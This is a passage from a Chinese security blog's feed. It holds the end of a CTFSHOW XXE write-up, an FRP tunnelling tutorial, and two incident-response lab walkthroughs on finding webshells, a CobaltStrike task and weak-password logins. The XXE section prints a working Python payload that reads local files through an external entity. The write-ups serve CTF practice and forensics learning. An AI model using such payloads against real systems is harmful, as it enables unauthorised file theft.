class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = payload.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line">response = requests.post(url, data=payload)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p>先在vps监听端口，然后运行脚本</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724165226913.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250724165303767.png"></p><h3 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h3><p>打开题目看到一个登录框</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724165542892.png"></p><p><code>ctrl+u</code>查看网页源码，可以判断存在XXE漏洞</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724171149199.png"></p><p>在登录框页面随便输入个账号密码，可以看到有回显，因此是属于<strong>有回显</strong>的XXE</p><p><img src="https://oss.waynejoons.icu/picphoto/20250724171446705.png"></p><p>因此我们可以构造XML payload，然后POST发送到&#x2F;doLogin即可，这里用python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://39e1f8ce-fd5e-483d-a620-38d00350bff3.challenge.ctf.show/doLogin&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="string">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;&amp;xxe;&lt;/password&gt;&lt;/user&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">response = requests.post(url, data=payload)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250724180656298.png"></p>]]></content>
    
    
    <summary type="html">CTFSHOW XXE专题详细题解</summary>
    
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/categories/CTFSHOW/"/>
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/tags/CTFSHOW/"/>
    
    <category term="CTF练习" scheme="https://waynejoon.github.io/tags/CTF%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>工具推荐 | 内网穿透神器FRP部署教程</title>
    <link href="https://waynejoon.github.io/posts/frp-deployment-tutorial/"/>
    <id>https://waynejoon.github.io/posts/frp-deployment-tutorial/</id>
    <published>2025-07-22T06:48:46.000Z</published>
    <updated>2025-07-22T06:58:06.399Z</updated>
    
    <content type="html"><![CDATA[<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>FRP是一款高性能的反向代理工具，可以将位于NAT或防火墙后的本地服务器暴露到互联网上。目前支持TCP、UDP、HTTP和HTTPS协议，可通过域名将请求转发至内部服务，此外还提供P2P直连模式</p><p>Github地址：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>本文尽可能简单叙述，方便大家快速部署，因当前最新版是0.63.0，因此本文在0.63.0的基础上书写</p><h2 id="准备条件"><a href="#准备条件" class="headerlink" title="准备条件"></a>准备条件</h2><ol><li>一台拥有<strong>公网IP</strong>的服务器（推荐阿里云、腾讯云等）</li><li>一个域名（非必需）</li></ol><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>打开<a href="https://github.com/fatedier/frp/tree/v0.63.0">https://github.com/fatedier/frp/tree/v0.63.0</a>, 下载frp_0.63.0_linux_amd64.tar.gz</p><p><img src="https://oss.waynejoons.icu/picphoto/20250722105650691.png"></p><p>上传到服务器然后解压</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf frp_0.63.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>cd进入<code>frp_0.63.0_linux_amd64</code>文件夹，输入<code>vim frps.toml</code>编辑frps.toml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># frp客户端与服务端连接的端口</span><br><span class="line">bindPort = 7000</span><br><span class="line"></span><br><span class="line"># 用来接收HTTP请求的端口</span><br><span class="line">vhostHTTPPort = 8088#如端口冲突可自行切换</span><br><span class="line"></span><br><span class="line"># 认证配置</span><br><span class="line">[auth]</span><br><span class="line">token = &quot;admin_token&quot;  #用于连接验证，请自行设置</span><br><span class="line"></span><br><span class="line"># Web仪表盘配置</span><br><span class="line">[webServer]</span><br><span class="line">addr = &quot;0.0.0.0&quot;</span><br><span class="line">port = 7500</span><br><span class="line">user = &quot;admin&quot;#请自行设置</span><br><span class="line">password = &quot;admin&quot;#请自行设置</span><br></pre></td></tr></table></figure><p>按下ESC进入命令模式，然后输入<code>:wq</code>并按回车键，保存文件并退出Vim</p><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>为了能在后台持续运行，这里用screen启动一个新窗口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -S frp#名字可以自定义</span><br></pre></td></tr></table></figure><p>赋予执行权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x frps</span><br></pre></td></tr></table></figure><p>运行脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.toml</span><br></pre></td></tr></table></figure><p>按下组合键 <code>ctrl+a+d</code> 关闭当前screen窗口，运行下面的命令可以再次进入窗口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">screen -ls#查看当前screen状态</span><br><span class="line">screen -r frp</span><br></pre></td></tr></table></figure><h3 id="网页仪表盘"><a href="#网页仪表盘" class="headerlink" title="网页仪表盘"></a>网页仪表盘</h3><p>成功运行之后，打开<code>http://你的服务器IP:7500</code>，即可进入仪表盘页面，可以查看当前的配置、连接等状态</p><p><img src="https://oss.waynejoons.icu/picphoto/20250722110625687.png"></p><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>打开<a href="https://github.com/fatedier/frp/tree/v0.63.0">https://github.com/fatedier/frp/tree/v0.63.0</a>, 下载frp_0.63.0_windows_amd64.zip</p><p><img src="https://oss.waynejoons.icu/picphoto/20250722105755964.png"></p><h3 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h3><p>解压并打开文件夹，编辑<code>frpc.toml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">serverAddr = &quot;你的服务器IP地址&quot;</span><br><span class="line">serverPort = 7000</span><br><span class="line"></span><br><span class="line">[auth]</span><br><span class="line">token = &quot;admin_token&quot;#需要跟服务端的token保持一致，用于验证</span><br><span class="line"></span><br><span class="line">[[proxies]]</span><br><span class="line">name = &quot;my-web-service&quot;#可自行设置</span><br><span class="line">type = &quot;tcp&quot;#穿透的协议类型，ip+端口的话用tcp</span><br><span class="line">localPort = 80#需要穿透的本机端口</span><br><span class="line">remotePort = 8085#指定服务端访问的端口，也就是可以通过&quot;你的服务器IP:8085&quot;访问到本机的&quot;127.0.0.1:80&quot;</span><br></pre></td></tr></table></figure><h3 id="可选-域名配置"><a href="#可选-域名配置" class="headerlink" title="(可选)域名配置"></a>(可选)域名配置</h3><p>如果你有自己的域名，则可以进行域名配置，以获得更佳的体验</p><p>我这里用的是namesilo，其他的域名提供商也一样操作</p><p><img src="https://oss.waynejoons.icu/picphoto/20250722112515304.png"></p><p>具体操作就是在DNS Record添加一条A记录，地址填你的服务器IP，名字可以自定义，后面就通过这个子域名访问你的服务</p><p>然后打开<code>frpc.toml</code>重新编辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">serverAddr = &quot;你的服务器IP地址&quot;</span><br><span class="line">serverPort = 7000</span><br><span class="line"></span><br><span class="line">[auth]</span><br><span class="line">token = &quot;admin_token&quot;#需要跟服务端的token保持一致，用于验证</span><br><span class="line"></span><br><span class="line">[[proxies]]</span><br><span class="line">name = &quot;my-web-service&quot;</span><br><span class="line">type = &quot;http&quot;#域名+端口的话需要用http</span><br><span class="line">localPort = 80#需要穿透的本机端口，也就是可以通过&quot;你的域名:8088&quot;访问到本机的&quot;127.0.0.1:80&quot;</span><br><span class="line">customDomains = [&quot;win.xxxxxx.com&quot;]#这里用你自己的域名</span><br></pre></td></tr></table></figure><p>需要注意的是，当代理类型为 <code>http</code> 或 <code>https</code>时，访问端口由<strong>服务端</strong>的 <code>vhostHTTPPort</code>决定，而不是客户端的 <code>remotePort</code></p><h3 id="运行-1"><a href="#运行-1" class="headerlink" title="运行"></a>运行</h3><p>在<code>frp_0.63.0_windows_amd64</code>文件夹打开cmd，输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc -c frpc.toml</span><br></pre></td></tr></table></figure><p>然后公网访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://你的服务器IP:8085</span><br></pre></td></tr></table></figure><p>如果你配置了域名，就可以公网访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win.xxxxxx.com:8088</span><br></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>这里我举个简单的例子，方便大家理解</p><h3 id="无域名"><a href="#无域名" class="headerlink" title="无域名"></a>无域名</h3><p>我在本地部署了一个DVWA漏洞靶场，假如我想把它分享给其他人，应该怎么做</p><p>在服务端部署完毕后，回到本地电脑，phpstudy打开服务</p><p><img src="https://oss.waynejoons.icu/picphoto/20250722124025986.png"></p><p>由于我的DVWA部署在本地8084端口，因此先修改<code>frpc.toml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">serverAddr = &quot;你的服务器IP地址&quot;</span><br><span class="line">serverPort = 7000</span><br><span class="line"></span><br><span class="line">[auth]</span><br><span class="line">token = &quot;admin_token&quot;</span><br><span class="line"></span><br><span class="line">[[proxies]]</span><br><span class="line">name = &quot;my-web-service&quot;</span><br><span class="line">type = &quot;tcp&quot;</span><br><span class="line">localPort = 8084#需要穿透的本机端口</span><br><span class="line">remotePort = 8085#指定服务端的端口</span><br></pre></td></tr></table></figure><p>然后保存退出，在当前文件夹cmd执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc -c frpc.toml</span><br></pre></td></tr></table></figure><p>接着访问<code>你的服务器IP地址:8085</code>即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250722124430952.png"></p><h3 id="有域名"><a href="#有域名" class="headerlink" title="有域名"></a>有域名</h3><p>同样是以DVWA漏洞靶场为例，先用phpstudy打开服务，然后修改<code>frpc.toml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">serverAddr = &quot;你的服务器IP地址&quot;</span><br><span class="line">serverPort = 7000</span><br><span class="line"></span><br><span class="line">[auth]</span><br><span class="line">token = &quot;admin_token&quot;</span><br><span class="line"></span><br><span class="line">[[proxies]]</span><br><span class="line">name = &quot;my-web-service&quot;</span><br><span class="line">type = &quot;http&quot;</span><br><span class="line">localPort = 8084#需要穿透的本机端口</span><br><span class="line">customDomains = [&quot;win.xxxxxx.com&quot;]#这里用你自己的域名</span><br></pre></td></tr></table></figure><p>然后保存退出，在当前文件夹cmd执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc -c frpc.toml</span><br></pre></td></tr></table></figure><p>接着访问<code>你的域名:8088</code>即可</p><h2 id="常见问题与排错-FAQ"><a href="#常见问题与排错-FAQ" class="headerlink" title="常见问题与排错 (FAQ)"></a>常见问题与排错 (FAQ)</h2><p>如果你发现连接不到服务端的端口，请检查防火墙是否放行相关端口，如果系统本身已放行端口但仍无法访问，可能是服务器提供商那边的防火墙未放行，这时需要到提供商那边（假如是阿里云）放行相关端口</p><p><img src="https://oss.waynejoons.icu/picphoto/20250722133856406.png"></p>]]></content>
    
    
    <summary type="html">教你如何快速简单部署FRP</summary>
    
    
    
    <category term="工具推荐" scheme="https://waynejoon.github.io/categories/%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90/"/>
    
    
    <category term="工具推荐" scheme="https://waynejoon.github.io/tags/%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90/"/>
    
  </entry>
  
  <entry>
    <title>玄机靶场 | Where-1S-tHe-Hacker-P2</title>
    <link href="https://waynejoon.github.io/posts/Xuanji-CTF-Where-1S-tHe-Hacker-P2/"/>
    <id>https://waynejoon.github.io/posts/Xuanji-CTF-Where-1S-tHe-Hacker-P2/</id>
    <published>2025-07-20T04:23:32.000Z</published>
    <updated>2025-07-20T04:25:40.881Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶机可以用玄机的，也可以在公众号下载，这里我选择用自己下载的，感谢划水但不摆烂提供的资源</p><p>题目下载地址：<a href="https://pan.baidu.com/s/14OPvxDgsEsY-O3e34K2FUw?pwd=2024">https://pan.baidu.com/s/14OPvxDgsEsY-O3e34K2FUw?pwd=2024</a></p><p>划水应急工具包：<a href="https://pan.baidu.com/s/1dwBMRQO3TUEMx8FWVeJLew?pwd=ltja">https://pan.baidu.com/s/1dwBMRQO3TUEMx8FWVeJLew?pwd=ltja</a> </p><p>服务器账号密码  admin  Aa123456</p><p>进去后运行phpstudy开启相关服务</p><p>因为玄机的题目是从靶机内部题目挑选的，不完整，因此本文分两部分</p><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><img src="https://oss.waynejoons.icu/picphoto/20250719181500774.png"></p><h2 id="玄机题目"><a href="#玄机题目" class="headerlink" title="玄机题目"></a>玄机题目</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤#1"></a>步骤#1</h3><p><strong>最早的WebShell落地时间是（时间格式统一为：2022&#x2F;12&#x2F;12&#x2F;2:22:22）;</strong></p><p>上传D盾到目标机器，把<code>C:\phpstudy_pro\WWW</code>目录放入D盾扫描</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719182940827.png"></p><p>发现大量WebShell文件，点进去<code>C:\phpstudy_pro\WWW\attachment\php\2023\11</code>，按时间排序，找到最早的WebShell落地时间即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719183440494.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250719183612285.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2023/11/11/0:30:07&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤#2"></a>步骤#2</h3><p><strong>黑客最早的WebShell密码是多少，将WebShell密码作为Flag值提交；</strong></p><p>用记事本打开WebShell文件，找到连接密码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719183729473.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;pass&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤#3"></a>步骤#3</h3><p><strong>CobaltStrike木马被添加进计划任务的时间是</strong></p><p>win+r输入<code>taskschd.msc</code>打开任务计划程序，找到<code>\Microsoft\Windows\AppID\</code>，查看计划任务，发现有个可疑任务，在每天9:50自动触发，查看启动程序</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719202237569.png"></p><p>但是这个huorong.exe我怎么找都找不到，网上百度了一下，发现别人也找不到，最后查看官方WP确定了这是个木马文件，但是不知道什么原因找不到了</p><p>然后我们导出该文件，用浏览器打开</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719202651632.png"></p><p><img src="https://oss.waynejoons.icu/picphoto/20250719202738762.png"></p><p>成功得到CobaltStrike木马文件的修改时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2023/11/15/8:02:20&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤#4"></a>步骤#4</h3><p><strong>黑客启用并添加进管理员组的用户与时间是 答案格式：Username,2022&#x2F;12&#x2F;12&#x2F;2:22:22）；</strong></p><p>用D盾检测用户账号，发现Guest被启用并添加进管理员组</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719203402299.png"></p><p>cmd打开输入<code>net user guest</code>查看guest的修改时间</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719203753561.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;guest,2023/11/11/0:45:59&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-5"><a href="#步骤-5" class="headerlink" title="步骤#5"></a>步骤#5</h3><p><strong>攻击者使用弱口令登录ftp的时间是</strong></p><p>打开<code>C:\phpstudy_pro\Extensions\FTP0.9.60\Logs</code>查看FTP的登录日志</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719203943003.png"></p><p>总共三个，一个个点进去看看，发现第二个有问题</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719204037239.png"></p><p>成功得到攻击者登录ftp的时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2023/11/11/1:08:54&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-6"><a href="#步骤-6" class="headerlink" title="步骤#6"></a>步骤#6</h3><p><strong>攻击者使用弱口令登录web管理员的时间是</strong></p><p>这里我们主要审计Apache的日志，打开<code>C:\phpstudy_pro\Extensions\Apache2.4.39\logs</code>，审计<code>access.log.1700006400</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250719204858120.png"></p><p>题目问的是攻击者使用弱口令登录web管理员的时间，我们可以尝试用弱口令自己爆破网站，然后抓取登录成功的包，在日志里面进行匹配，就可以找到攻击者的登录时间</p><p>打开浏览器输入<code>127.0.0.1/index.php</code>，然后点击上一级，回到首页</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719205251094.png"></p><p>用弱口令字典爆破即可，不限方法，爆破得到账号为admin，密码为123456，然后登录抓包</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719205542369.png"></p><p>重新回到日志，ctrl+f搜索<code>index.php?mod=site&amp;act=manager&amp;do=main&amp;beid=1</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250719205937334.png"></p><p>成功得到攻击者登录后台管理页面的时间</p><p>如果你不想爆破网站，直接分析日志也可以，一般情况下登录成功会有302跳转，我们可以直接筛选302跳转，并根据日志特征进行匹配</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719210333921.png"></p><p>可以看到URI里面包含manager，通过上下文分析，可以确定这是登录成功的跳转页面，不过想更精确的话还是第一种方法好</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2023/11/15/7:38:31&#125;</span><br></pre></td></tr></table></figure><h2 id="靶机内部题目（除去相同题目）"><a href="#靶机内部题目（除去相同题目）" class="headerlink" title="靶机内部题目（除去相同题目）"></a>靶机内部题目（除去相同题目）</h2><h3 id="步骤-7"><a href="#步骤-7" class="headerlink" title="步骤#7"></a>步骤#7</h3><p><strong>CobaltStrike远程控制木马的文件名与落地时间是？（答案格式：ABC.exe,2022&#x2F;12&#x2F;12&#x2F;2:22:22）</strong></p><p>这题我用绿盟D-Eyes扫了很久都没扫出来，在安全中心的隔离区也没找到，不知道什么原因，查找计划任务里面的木马路径也没有</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719211854018.png"></p><p>一般情况下遇到这种题目，我们用安全工具扫描就可以，例如火绒、绿盟D-Eyes等，但是这里不知道为什么电脑找不到这个木马</p><p>这里直接给出官方的答案</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">huorong.exe,2023/11/15/7:45:47</span><br></pre></td></tr></table></figure><h3 id="步骤-8"><a href="#步骤-8" class="headerlink" title="步骤#8"></a>步骤#8</h3><p><strong>攻击者查看上传回显路径的时间是？</strong></p><p>攻击者上传木马之后，需要知道文件被上传到哪里，这时我们从攻击者登录后台管理员账号的时间之后开始审计日志</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719214937022.png"></p><p>这里可以看到，在一大波注入攻击之后出现一个文件查询的URI，猜测是显示文件路径的，我们粘贴到网页执行（先登录网站）</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719215427117.png"></p><p>这些参数的URL就是木马文件路径，可以尝试蚁剑连接验证</p><p><img src="https://oss.waynejoons.icu/picphoto/20250719215849492.png"></p><p>确定是木马文件，成功得到攻击者查看上传回显路径的时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2023/11/15/7:38:53</span><br></pre></td></tr></table></figure><h3 id="步骤-9"><a href="#步骤-9" class="headerlink" title="步骤#9"></a>步骤#9</h3><p><strong>第二批WebShell的最早上传时间是？</strong></p><p>前面我们知道了木马的回显路径，因此可以在该路径上进行分析，打开<code>C:\phpstudy_pro\WWW\attachment\2023\11</code>，然后按时间排序，可以看到木马的上传时间分两个时间段，一些是2023&#x2F;11&#x2F;11，另一些是2023&#x2F;11&#x2F;15</p><p><img src="https://oss.waynejoons.icu/picphoto/20250720111723985.png"></p><p>打开15号最早的文件验证，确定是木马文件</p><p><img src="https://oss.waynejoons.icu/picphoto/20250720111745290.png"></p><p>右键打开属性，获取具体时间</p><p><img src="https://oss.waynejoons.icu/picphoto/20250720112146275.png"></p><p>当然如果想稳妥的话还是分析日志文件好，打开<code>C:\phpstudy_pro\Extensions\Apache2.4.39\logs\access.log.1700006400</code>，筛选出状态码为200的日志记录进行分析</p><p><img src="https://oss.waynejoons.icu/picphoto/20250720112740417.png"></p><p>可以看到这里攻击者采用了SSRF攻击，通过在<code>inc_config.php</code>写入木马，让网站去fetch这个文件并保存在本地，然后通过webshell连接并控制网站，因此第二批WebShell的最早上传时间就是这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2023/11/15/7:40:10</span><br></pre></td></tr></table></figure><h3 id="步骤-10"><a href="#步骤-10" class="headerlink" title="步骤#10"></a>步骤#10</h3><p><strong>根据上题线索，WebShell开始通信的时间是？</strong></p><p>沿着上面的日志记录继续往下分析，发现可疑记录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250720115617322.png"></p><p>可以看到发送POST请求，与木马文件进行交互，打开文件验证一下</p><p><img src="https://oss.waynejoons.icu/picphoto/20250720115832852.png"></p><p>因此WebShell开始通信的时间就是这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2023/11/15/7:42:36</span><br></pre></td></tr></table></figure><h2 id="靶机内部题目答案"><a href="#靶机内部题目答案" class="headerlink" title="靶机内部题目答案"></a>靶机内部题目答案</h2><p>这是靶机内部<strong>答题.exe</strong>的答案</p><p><img src="https://oss.waynejoons.icu/picphoto/20250720120136515.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><strong>特别鸣谢</strong></p><p>划水但不摆烂：<a href="https://mp.weixin.qq.com/s/4PQ5TaBUUpW_9hkm-kue1Q">https://mp.weixin.qq.com/s/4PQ5TaBUUpW_9hkm-kue1Q</a></p>]]></content>
    
    
    <summary type="html">玄机靶场刷题记录</summary>
    
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>玄机靶场 | Where-1S-tHe-Hacker</title>
    <link href="https://waynejoon.github.io/posts/Xuanji-CTF-Where-1S-tHe-Hacker/"/>
    <id>https://waynejoon.github.io/posts/Xuanji-CTF-Where-1S-tHe-Hacker/</id>
    <published>2025-06-18T12:13:42.000Z</published>
    <updated>2025-07-20T05:02:37.010Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我一开始用的是在线靶机，但是因为一些不可抗拒因素，具体参考步骤#11，所以最终把靶机下载到本地分析，同时也能省点金币，题目可以在划水但不摆烂公众号下载</p><p>题目下载地址：<a href="https://pan.baidu.com/s/1MwRbI6Cbz2j_hlHInVL1Bg?pwd=fmzu">https://pan.baidu.com/s/1MwRbI6Cbz2j_hlHInVL1Bg?pwd=fmzu</a></p><p>服务器账号密码  admin  Aa123456</p><p>注：样本请勿在本地运行</p><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><img src="https://oss.waynejoons.icu/picphoto/20250621145941550.png"></p><h2 id="玄机题目"><a href="#玄机题目" class="headerlink" title="玄机题目"></a>玄机题目</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤#1"></a>步骤#1</h3><p><strong>找到黑客ID 为多少,将黑客ID 作为 FLAG 提交;</strong></p><p>打开网页根目录，发现index.php被挂了黑页，在文件内容里面找到黑客ID</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617162531550.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;X123567X&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤#2"></a>步骤#2</h3><p><strong>找到黑客在什么时间修改了网站主页,将黑客修改了网站主页的时间 作为 FLAG 提交（y-m-d-4:22:33）;</strong></p><p>直接查看属性，找到修改时间</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617163053125.png"></p><p>提交的时候有个问题，如果时间你是直接复制属性中的，提交时会显示错误，因为属性中的时间携带不可见字符，正确的做法是自己手打进去，具体可以看看010editor的分析</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617201037455.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2023-11-6-4:55:13&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤#3"></a>步骤#3</h3><p><strong>找到黑客第一个webshell文件名是,将第一个webshell文件名 作为FLAG 提交;</strong></p><p>可以用D盾，也可以手工排查，这里我选择手工排查</p><p>找到Apache目录下的访问日志</p><p><img src="https://oss.waynejoons.icu/picphoto/20250617165532102.png"></p><p>前面大量的HEAD表示的是黑客在进行目录扫描，可以不看，直接跳到后半部分扫描结束那里，通过排查，发现两个疑似webshell的可疑文件</p><p><img 